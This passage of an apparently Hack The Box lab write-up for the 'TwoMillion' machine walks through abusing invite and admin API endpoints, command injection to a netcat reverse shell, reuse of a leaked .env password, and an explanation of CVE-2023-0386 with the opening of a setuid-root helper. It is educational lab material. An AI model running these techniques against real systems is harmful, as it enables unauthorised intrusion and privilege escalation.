</span></span></code></pre></div><p><strong>Let’s add 10.10.11.221 host to our /etc/hosts file:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.221 	2million.htb&#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="port---22-enumeration">Port - 22 Enumeration<a hidden class="anchor" aria-hidden="true" href="#port---22-enumeration">#</a></h2>
<p>We tried the same thing for SSH. We login into SSH anonymous but it&rsquo;s also a failed attempt.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh anonymous@10.10.10.245
</span></span><span class="line"><span class="cl">anonymous@10.10.10.245<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Permission denied, please try again.
</span></span></code></pre></div><h2 id="port---80-enumeration">Port - 80 Enumeration<a hidden class="anchor" aria-hidden="true" href="#port---80-enumeration">#</a></h2>
<h3 id="response-headers">Response Headers<a hidden class="anchor" aria-hidden="true" href="#response-headers">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Server: nginx
</span></span><span class="line"><span class="cl">Date: Sun, <span class="m">19</span> Jan <span class="m">2025</span> 08:32:05 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Set-Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>srsk0h13obnn855016i953mfd7<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
</span></span><span class="line"><span class="cl">Expires: Thu, <span class="m">19</span> Nov <span class="m">1981</span> 08:52:00 GMT
</span></span><span class="line"><span class="cl">Cache-Control: no-store, no-cache, must-revalidate
</span></span><span class="line"><span class="cl">Pragma: no-cache
</span></span></code></pre></div><h3 id="technology-detection">Technology Detection<a hidden class="anchor" aria-hidden="true" href="#technology-detection">#</a></h3>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118175246.png"></p>
<h3 id="application-overview">Application Overview<a hidden class="anchor" aria-hidden="true" href="#application-overview">#</a></h3>
<p>The application resembles HTB&rsquo;s old version from 2017. It includes pages such as Login, Invite, Hall of Fame, and FAQ.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118192645.png"></p>
<p>The the old version of HTB requires an invitation code for the user Sign</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118192712.png"></p>
<p>I tried to play with the invitation code option and observed that the application is calling the 2 Javascript files that are being used to send API requests. We tried to see what the both js file contains.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/SCR-20250118-qyvb.png"></p>
<h3 id="obfuscated-code">Obfuscated Code<a hidden class="anchor" aria-hidden="true" href="#obfuscated-code">#</a></h3>
<p>We found that the supposed to be inviteapi.min.js is responsible for sending the invitation validation request. The JavaScript file contains multiple keywords like POST, makeInviteCode, verifyInviteCode so looks like it is obfuscated.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250119133421.png">
We used <a href="https://de4js.kshift.me/">de4js JavaScript Deobfuscator and Unpacker</a> to get the JavaScript in Deobfuscated format.</p>
<p><strong>Deobfuscated JavaScript:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">verifyInviteCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">code</span><span class="o">:</span> <span class="nx">code</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">};</span>
</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="nx">formData</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;/api/v1/invite/verify&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">makeInviteCode</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">dataType</span><span class="o">:</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;/api/v1/invite/how/to/generate&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">success</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>From the deobfuscated JavaScript we can see that the JavaScript contains 2 functions.</p>
<ol>
<li>Function <strong>verifyInviteCode</strong> is responsible for verifying the Invitation code.</li>
<li>Function <strong>makeInviteCode</strong> is responsible for generating the Invitation code.</li>
</ol>
<h3 id="generate-invitation-token">Generate Invitation Token<a hidden class="anchor" aria-hidden="true" href="#generate-invitation-token">#</a></h3>
<p>Upon sending a POST request for <a href="http://2million.htb/api/v1/invite/how/to/generate">How-to-Generate</a> application returns the ROT13 encrypted string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://2million.htb/api/v1/invite/how/to/generate
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;0&#34;</span>:200,<span class="s2">&#34;success&#34;</span>:1,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&#34;</span>,<span class="s2">&#34;enctype&#34;</span>:<span class="s2">&#34;ROT13&#34;</span><span class="o">}</span>,<span class="s2">&#34;hint&#34;</span>:<span class="s2">&#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>We have converted the ROT13 string to cleartext format and it gave a hint for another endpoint.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">In order to generate the invite code, make a POST request to /api/v1/invite/generate
</span></span></code></pre></div><p>Upon sending a POST request for <a href="http://2million.htb/api/v1/invite/generate">Generate-invite</a> application returns a base64 encoded string.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; curl -X POST http://2million.htb/api/v1/invite/generate
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;0&#34;</span>:200,<span class="s2">&#34;success&#34;</span>:1,<span class="s2">&#34;data&#34;</span>:<span class="o">{</span><span class="s2">&#34;code&#34;</span>:<span class="s2">&#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=&#34;</span>,<span class="s2">&#34;format&#34;</span>:<span class="s2">&#34;encoded&#34;</span><span class="o">}}</span>
</span></span></code></pre></div><p>We have converted the base64 encoded string to clear text format which gives us our invitation code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; <span class="nb">echo</span> <span class="s2">&#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=&#34;</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">0MEG4-BRSC3-HHYJD-S45QD
</span></span></code></pre></div><h3 id="registration-page">Registration Page<a hidden class="anchor" aria-hidden="true" href="#registration-page">#</a></h3>
<p>We have entered our invitation code and which allows us to login into application with our username and password.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118194554.png"></p>
<h2 id="user-dashboard">User Dashboard<a hidden class="anchor" aria-hidden="true" href="#user-dashboard">#</a></h2>
<p>We have login into the application and we saw very limited options. A few of them are:</p>
<ol>
<li>Dashboard</li>
<li>FAQ</li>
<li>Generate the VPN Connection File</li>
</ol>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118194641.png"></p>
<h3 id="available-api-endpoints">Available API Endpoints<a hidden class="anchor" aria-hidden="true" href="#available-api-endpoints">#</a></h3>
<p>The interesting part of generating a VPN connection file was, It is called the <code>api/v1/user/vpn/download</code>. We can get the list of API endpoints by calling the <code>/api/v1</code>.</p>
<p>It was observed that the application contains the admin API as well. Admin API contains 3 endpoints:</p>
<ol>
<li><strong>GET</strong> - <code>/api/v1/admin/auth</code> : Check if user is admin or not</li>
<li><strong>POST</strong> - <code>/api/v1/admin/vpn/generate</code> : Generate VPN for specific user</li>
<li><strong>PUT</strong> - <code>/api/v1/admin/settings/update</code> : Update user settings</li>
</ol>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118195949.png"></p>
<h3 id="check-user-admin-right-status">Check User Admin Right Status<a hidden class="anchor" aria-hidden="true" href="#check-user-admin-right-status">#</a></h3>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118200428.png"></p>
<h3 id="update-the-user-rights">Update the User Rights<a hidden class="anchor" aria-hidden="true" href="#update-the-user-rights">#</a></h3>
<p><strong>Update admin settings</strong> API returns the error message which shows that the API request is missing an email parameter.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/SCR-20250118-rmpc.png"></p>
<p>We have added the email parameter and sent the request. It&rsquo;s observed that the API request is missing the &ldquo;is_admin&rdquo; parameter.
<img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118200809.png"></p>
<p>We have added the missing parameter and based on the response it&rsquo;s observed that the User has now admin privilege.
<img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118203710.png"></p>
<h4 id="admin-access-check">Admin Access Check<a hidden class="anchor" aria-hidden="true" href="#admin-access-check">#</a></h4>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118203632.png"></p>
<h4 id="generate-vpn-file">Generate VPN File<a hidden class="anchor" aria-hidden="true" href="#generate-vpn-file">#</a></h4>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118203602.png"></p>
<h3 id="command-execution">Command Execution<a hidden class="anchor" aria-hidden="true" href="#command-execution">#</a></h3>
<p>It&rsquo;s observed that generated VPN profile endpoint is vulnerable to command Injection.
<img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118203832.png"></p>
<h2 id="shell-as-www-data">Shell as www-data<a hidden class="anchor" aria-hidden="true" href="#shell-as-www-data">#</a></h2>
<p>To get the reverse shell, we are using the netcat command.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118204518.png"></p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118204546.png">
Volia 🥳 We got the connection back to our terminal.</p>
<p>Let&rsquo;s Upgrade the shell:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ctrl + z
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span></code></pre></div><h3 id="get-the-user-flag">Get the User Flag<a hidden class="anchor" aria-hidden="true" href="#get-the-user-flag">#</a></h3>
<p>Let&rsquo;s cat the user flag…! Look like www-data user doesn&rsquo;t have permission to view the file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:/home/admin$ cat user.txt
</span></span><span class="line"><span class="cl">cat: user.txt: Permission denied
</span></span></code></pre></div><p><strong>List the Files, Directories and it&rsquo;s permission:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:/home/admin$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">32</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> ..
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> May <span class="m">26</span>  <span class="m">2023</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin  <span class="m">220</span> May <span class="m">26</span>  <span class="m">2023</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin <span class="m">3771</span> May <span class="m">26</span>  <span class="m">2023</span> .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .cache
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> admin admin  <span class="m">807</span> May <span class="m">26</span>  <span class="m">2023</span> .profile
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> admin admin <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> .ssh
</span></span><span class="line"><span class="cl">-rw-r----- <span class="m">1</span> root  admin   <span class="m">33</span> Jan <span class="m">18</span> 12:03 user.txt
</span></span></code></pre></div><h2 id="shell-as-admin">Shell as admin<a hidden class="anchor" aria-hidden="true" href="#shell-as-admin">#</a></h2>
<p>We tried few ways to login as admin. From hint, we found that the .env file contains the DB username and password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:~/html$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">56</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">10</span> root root <span class="m">4096</span> Jan <span class="m">18</span> 15:20 .
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> ..
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">87</span> Jun  <span class="m">2</span>  <span class="m">2023</span> .env
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">1237</span> Jun  <span class="m">2</span>  <span class="m">2023</span> Database.php
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">2787</span> Jun  <span class="m">2</span>  <span class="m">2023</span> Router.php
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> root root <span class="m">4096</span> Jan <span class="m">18</span> 15:20 VPN
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> assets
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> controllers
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> css
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> fonts
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> images
</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">2692</span> Jun  <span class="m">2</span>  <span class="m">2023</span> index.php
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> js
</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Jun  <span class="m">6</span>  <span class="m">2023</span> views
</span></span></code></pre></div><p><strong>Environment Variables:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@2million:~/html$ cat .env
</span></span><span class="line"><span class="cl"><span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
</span></span><span class="line"><span class="cl"><span class="nv">DB_DATABASE</span><span class="o">=</span>htb_prod
</span></span><span class="line"><span class="cl"><span class="nv">DB_USERNAME</span><span class="o">=</span>admin
</span></span><span class="line"><span class="cl"><span class="nv">DB_PASSWORD</span><span class="o">=</span>SuperDuperPass123
</span></span></code></pre></div><p>We have the env variable file which contains the username and password. Let&rsquo;s try to open the <code>/etc/passwd</code> file and see if does admin user exists in the system or not. It looks like the admin user does exist on the system.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118210314.png"></p>
<h3 id="shell-as-admin-1">Shell as admin<a hidden class="anchor" aria-hidden="true" href="#shell-as-admin-1">#</a></h3>
<p>We can log in as admin users who read the user flag.</p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118210503.png"></p>
<p><img loading="lazy" src="/images/HTB/TwoMillion/Pasted%20image%2020250118210516.png"></p>
<p>Now, Let&rsquo;s jump for root flag 🚩</p>
<h2 id="shell-as-root">Shell as root<a hidden class="anchor" aria-hidden="true" href="#shell-as-root">#</a></h2>
<p>From the hint, we get to know that the admin user has to do something with the mail system on Linux. We got the admin file under the mail directory which contains the mail from <strong>ch4p</strong> regarding the Patching System OS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">From: ch4p &lt;ch4p@2million.htb&gt;
</span></span><span class="line"><span class="cl">To: admin &lt;admin@2million.htb&gt;
</span></span><span class="line"><span class="cl">Cc: g0blin &lt;g0blin@2million.htb&gt;
</span></span><span class="line"><span class="cl">Subject: Urgent: Patch System OS
</span></span><span class="line"><span class="cl">Date: Tue, <span class="m">1</span> June <span class="m">2023</span> 10:45:22 -0700
</span></span><span class="line"><span class="cl">Message-ID: &lt;9876543210@2million.htb&gt;
</span></span><span class="line"><span class="cl">X-Mailer: ThunderMail Pro 5.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hey admin,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m know you&#39;</span>re working as fast as you can to <span class="k">do</span> the DB migration. While we<span class="s1">&#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#39;</span>t get popped by that.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTB Godfather
</span></span></code></pre></div><h3 id="failed-attempt">Failed Attempt<a hidden class="anchor" aria-hidden="true" href="#failed-attempt">#</a></h3>
<p>We searched OverlayFS CVE and came across this article by <a href="https://projectdiscovery.io/blog/gameover-lay-local-privilege-escalation-in-ubuntu-kernel">ProjectDiscovery</a>.</p>
<p>We got the access as the root user but still, it&rsquo;s not a complete root permission.</p>
<h3 id="cve-2023-0386-analysis">CVE-2023-0386 Analysis<a hidden class="anchor" aria-hidden="true" href="#cve-2023-0386-analysis">#</a></h3>
<p>I started searching again and it&rsquo;s observed that the machine is vulnerable to CVE-2023-0386.</p>
<p><strong>From Google:</strong>
CVE-2023-0386 is a high-severity vulnerability in the Linux kernel&rsquo;s overlayfs filesystem. Improper permission handling allows local attackers to easily escalate privileges to root, compromising the entire system.</p>
<h4 id="how-to-detect">How to Detect?<a hidden class="anchor" aria-hidden="true" href="#how-to-detect">#</a></h4>
<p>The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the command <code>uname -r</code></p>
<p>A system is likely to be vulnerable if it has a kernel version lower than 6.2. We found that our Linux machine is running on 5.15</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin@2million:~$ uname -r
</span></span><span class="line"><span class="cl">5.15.70-051570-generic
</span></span></code></pre></div><p>Let&rsquo;s understand what is SUID, OverlayFS…</p>
<h4 id="what-is-suid-bit">What is SUID bit?<a hidden class="anchor" aria-hidden="true" href="#what-is-suid-bit">#</a></h4>
<p>SUID, short for Set User ID, is <strong>a special permission that can be assigned to executable files</strong>. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file&rsquo;s owner.</p>
<h4 id="what-is-overlayfs">What is OverlayFS?<a hidden class="anchor" aria-hidden="true" href="#what-is-overlayfs">#</a></h4>
<p>Overlay filesystems, also known as “union filesystems” or “union mounts” let you mount a filesystem using 2 directories: a “lower” directory, and an “upper” directory.</p>
<h5 id="1-structure">1. Structure<a hidden class="anchor" aria-hidden="true" href="#1-structure">#</a></h5>
<p>OverlayFS uses three main components:</p>
<ul>
<li><strong>Lower directory</strong>: Read-only base layer containing the original files.</li>
<li><strong>Upper directory</strong>: Writable layer where changes are made.</li>
<li><strong>Merged view</strong>: The combined result of the lower and upper directories.</li>
</ul>
<h5 id="2-file-operations">2. File Operations<a hidden class="anchor" aria-hidden="true" href="#2-file-operations">#</a></h5>
<ul>
<li><strong>Read</strong>:
<ul>
<li>If a file exists in both layers, the version in the upper layer is presented.</li>
<li>If a file exists only in the lower layer, it is accessed from there.</li>
</ul>
</li>
<li><strong>Write</strong>:
<ul>
<li>If a file in the lower layer is modified, it is copied to the upper layer first (<strong>copy-on-write</strong>), and then the changes are applied to the copy.</li>
</ul>
</li>
<li><strong>Delete</strong>:
<ul>
<li>When a file in the lower layer is deleted, it is &ldquo;hidden&rdquo; by creating a <strong>whiteout marker</strong> in the upper layer.</li>
</ul>
</li>
</ul>
<h5 id="3-mounting-example">3. Mounting Example<a hidden class="anchor" aria-hidden="true" href="#3-mounting-example">#</a></h5>
<p>Assume you have:</p>
<ul>
<li>Lower layer: <code>/lower</code></li>
<li>Upper layer: <code>/upper</code></li>
<li>Mount point: <code>/merged</code></li>
</ul>
<p>Command to create an overlay:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mount -t overlay overlay -o <span class="nv">lowerdir</span><span class="o">=</span>/lower,upperdir<span class="o">=</span>/upper,workdir<span class="o">=</span>/work /merged
</span></span></code></pre></div><h4 id="how-does-the-cve-2023-0386-works">How does the CVE-2023-0386 Works?<a hidden class="anchor" aria-hidden="true" href="#how-does-the-cve-2023-0386-works">#</a></h4>
<ol>
<li>
<p><strong>Pretending to Have a Root-Owned File</strong>:</p>
<ul>
<li>The attacker uses a trick called <strong>FUSE</strong> (a tool for making fake filesystems) to create a &ldquo;fake&rdquo; file that looks like:
<ul>
<li>It&rsquo;s owned by the system administrator (<strong>root</strong>).</li>
<li>It has the <strong>SUID</strong> bit set, which means running this file will give whoever runs it admin-level privileges.</li>
</ul>
</li>
</ul>
<p>Normally, creating such a file directly on the system isn’t allowed unless you&rsquo;re already an admin. But with FUSE, you can fake it.</p>
</li>
<li>
<p><strong>Create a Safe &ldquo;Sandbox&rdquo; Environment</strong>:</p>
<ul>
<li>The attacker uses something called <strong>user namespaces</strong> to create a sandbox environment.</li>
<li>This lets them temporarily do things (like mounting filesystems) that normally require admin permissions.</li>
</ul>
</li>
<li>
<p><strong>Set Up the OverlayFS Trick</strong>:</p>
<ul>
<li>The attacker sets up an <strong>OverlayFS</strong> filesystem:
<ul>
<li>The <strong>lower directory</strong> (base layer) is the fake filesystem they made with FUSE.</li>
<li>The <strong>upper directory</strong> (writable layer) is something like <code>/tmp</code>, where anyone can write files.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Trigger the Kernel Bug</strong>:</p>
<ul>
<li>The attacker &ldquo;copies&rdquo; the fake file (from the lower layer) to the writable layer (upper directory).</li>
<li>When the kernel handles this copy, it <strong>believes the fake file’s permissions</strong> and creates a <strong>real file in <code>/tmp</code></strong> that:
<ul>
<li>Is owned by root.</li>
<li>Has the SUID bit set.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Escape the Sandbox and Exploit the File</strong>:</p>
<ul>
<li>The attacker exits the sandbox and now has a <strong>real root-owned SUID file</strong> in <code>/tmp</code>.</li>
<li>They execute this file to become <strong>root</strong> and take full control of the system.</li>
</ul>
</li>
</ol>
<h4 id="code-example">Code Example<a hidden class="anchor" aria-hidden="true" href="#code-example">#</a></h4>
<p>Here is the code example which I took from the <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">Datadog</a> article.</p>
<p>The code written in C will try to set setuid and setgid to root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;could not setuid(0): %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
